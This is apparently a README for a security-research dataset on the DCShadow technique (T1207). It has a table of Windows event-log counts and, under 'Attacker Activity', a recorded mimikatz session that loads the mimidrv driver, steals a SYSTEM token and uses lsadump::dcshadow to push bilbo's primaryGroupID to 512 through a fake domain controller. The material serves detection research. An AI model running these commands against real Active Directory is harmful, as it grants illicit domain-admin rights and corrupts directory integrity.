# DCShadow:
`DCShadow` allows the adversary to create new objects or change a user's attributes in the AD infrastructure. This is done by creating the `nTDSDSA` object class on the system they are on, which will `classify` that system as a domain controller (specifically a global catalog(GC) domain controller). The Directory Service Agent (DSA) will replicate any AD data changes to the legitimate domain controller(s) in the enviroment. 

## Technique(s) ID

T1207

## Creators

Jonathan Johnson [@jsecurity101](https://twitter.com/jsecurity101)

## Dataset

[mimikatz_dcshadow.tar.gz](./mimikatz_dcshadow.tar.gz)

## Network Environment

Shire

## Time Taken

2019-08-13161725

## About this file

| log_name                                   | source_name                           | task                                                   |   record_number |
|--------------------------------------------|---------------------------------------|--------------------------------------------------------|-----------------|
| System                                     | Microsoft-Windows-WindowsUpdateClient | Windows Update Agent                                   |               6 |
| System                                     | Microsoft-Windows-Kernel-General      |                                                        |               4 |
| System                                     | Service Control Manager               |                                                        |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Token Right Adjusted Events                            |           10482 |
| Security                                   | Microsoft-Windows-Security-Auditing   | File System                                            |            3287 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Removable Storage                                      |            1260 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Filtering Platform Connection                          |             521 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Handle Manipulation                                    |             261 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Registry                                               |              36 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Process Termination                                    |              17 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Process Creation                                       |              13 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Directory Service Access                               |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Group Membership                                       |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Logon                                                  |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Logoff                                                 |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Computer Account Management                            |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Detailed Directory Service Replication                 |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Directory Service Changes                              |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Special Logon                                          |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Kerberos Service Ticket Operations                     |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Other Object Access Events                             |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing   | Sensitive Privilege Use                                |               2 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity        |                                                        |              16 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | Registry object added or deleted (rule: RegistryEvent) |           23381 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | Registry value set (rule: RegistryEvent)               |            9421 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | Process accessed (rule: ProcessAccess)                 |            1241 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | Image loaded (rule: ImageLoad)                         |             515 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | Pipe Connected (rule: PipeEvent)                       |             336 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | File created (rule: FileCreate)                        |             124 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | Network connection detected (rule: NetworkConnect)     |             119 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | RawAccessRead detected (rule: RawAccessRead)           |              54 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              |                                                        |              53 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | Dns query (rule: DnsQuery)                             |              19 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | Process Create (rule: ProcessCreate)                   |               7 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | Pipe Created (rule: PipeEvent)                         |               2 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon              | Process terminated (rule: ProcessTerminate)            |               2 |


## Attacker Activity

```
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
mimikatz # !processtoken
Token from process 0 to process 0
 * from 0 will take SYSTEM token
 * to 0 will take all 'cmd' and 'mimikatz' process
Token from 4/System
 * to 3888/powershell.exe
 * to 7108/cmd.exe
 * to 8952/cmd.exe
 * to 6272/cmd.exe
 * to 8164/cmd.exe
 * to 9144/mimikatz.exe

mimikatz # lsadump::dcshadow /object:bilbo /attribute:primaryGroupID /value:512
** Domain Info **

Domain:         DC=shire,DC=com
Configuration:  CN=Configuration,DC=shire,DC=com
Schema:         CN=Schema,CN=Configuration,DC=shire,DC=com
dsServiceName:  ,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=shire,DC=com
domainControllerFunctionality: 7 ( WIN2016 )
highestCommittedUSN: 86111

** Server Info **

Server: HFDC1.shire.com
  InstanceId  : {2021b645-d9c2-416d-9684-182516ad6738}
  InvocationId: {2021b645-d9c2-416d-9684-182516ad6738}
Fake Server (not already registered): it001.shire.com

** Attributes checking **

#0: primaryGroupID

** Objects **

#0: bilbo
DN:CN=Bilbo Baggins,CN=Users,DC=shire,DC=com
  primaryGroupID (1.2.840.113556.1.4.98-90062 rev 1):
    512
    (00020000)


** Starting server **

 > BindString[0]: ncacn_ip_tcp:it001[50495]
 > RPC bind registered
 > RPC Server is waiting!
== Press Control+C to stop ==
  cMaxObjects : 1000
  cMaxBytes   : 0x00a00000
  ulExtendedOp: 0
  pNC->Guid: {acc0aa33-f5eb-4e79-a1d2-b114f483b939}
  pNC->Sid : S-1-5-21-47903322-2936176756-2312637138
  pNC->Name: DC=shire,DC=com
SessionKey: a434763a886784a31835ba50ada0474f446c2cebe1ed8a09f4b379b59b93e56d
1 object(s) pushed
 > RPC bind unregistered
 > stopping RPC server
 > RPC server stopped
```

```
mimikatz # lsadump::dcshadow /push
** Domain Info **

Domain:         DC=shire,DC=com
Configuration:  CN=Configuration,DC=shire,DC=com
Schema:         CN=Schema,CN=Configuration,DC=shire,DC=com
dsServiceName:  ,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=shire,DC=com
domainControllerFunctionality: 7 ( WIN2016 )
highestCommittedUSN: 86111

** Server Info **

Server: HFDC1.shire.com
  InstanceId  : {2021b645-d9c2-416d-9684-182516ad6738}
  InvocationId: {2021b645-d9c2-416d-9684-182516ad6738}
Fake Server (not already registered): it001.shire.com

** Performing Registration **

** Performing Push **

Syncing DC=shire,DC=com
Sync Done

** Performing Unregistration **
```